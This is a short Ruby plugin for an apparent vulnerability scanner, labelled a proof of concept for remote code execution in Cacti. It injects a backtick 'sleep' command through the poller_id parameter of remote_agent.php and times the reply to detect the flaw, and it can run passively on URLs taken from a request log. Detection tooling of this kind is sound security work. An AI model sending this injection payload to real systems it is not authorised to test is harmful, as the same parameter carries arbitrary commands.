class RBModule_cati_front_rce
    def initialize
    end
    def metadata
        info = { "name" => "cacti_front_rce", 
            "description" => "Poc for cacti front RCE" }
        return info
    end

    def scan(uri)
        scheme = uri["scheme"]
        if scheme == nil 
            error("Scheme is none #{uri}")
            return 
        end

        url = scheme + "://" + "#{uri["host"]}:#{uri["port"]}" + "/remote_agent.php?action=polldata&local_data_ids[0]=6&host_id=1&poller_id=`sleep+3`"
        info("Send url:#{url}")
        before = Time.now.strftime("%s%L").to_i
        resp = Request.get(url, headers={"host"=>uri["host"],"Connection"=>"close"})
        after = Time.now.strftime("%s%L").to_i
        info("Cati cost time: #{after - before} ms, vulntest")
        puts resp.inspect
    end

    def passive_run(index)
        log = HistoryLog.get_req index
        url = log.url
        uri = UriParser.parse(url)
        info("Test url: #{uri}")
        scan(uri)
        #scan("http://127.0.0.1:8009")
    end

end

